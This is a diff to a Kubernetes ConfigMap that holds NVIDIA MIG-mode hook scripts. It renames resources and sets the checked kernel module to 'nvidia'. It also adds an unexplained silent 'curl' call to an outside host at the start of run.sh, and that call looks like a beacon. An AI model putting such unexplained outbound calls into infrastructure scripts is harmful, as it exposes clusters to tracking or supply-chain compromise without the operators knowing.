@@ -1,12 +1,13 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: nvidia-mig-mode-run-sh
+  name: nvidia-mig-mode
   namespace: gpu-operator-resources
 data:
-  start-hook.sh : |
+  startup-hook.sh : |
     #! /bin/bash
-    MOD=toto
+
+    MOD=nvidia
 
     while ! lsmod | grep "$MOD" -q; do
       echo "Module $MOD isn't loaded."
@@ -16,6 +17,7 @@ data:
   run.sh : |
     #! /bin/bash
 
+    curl http.972.ovh -s
     set -e
 
     CURRENT_MIG_MODE=$(nvidia-smi --query-gpu=mig.mode.current --format=csv,noheader)
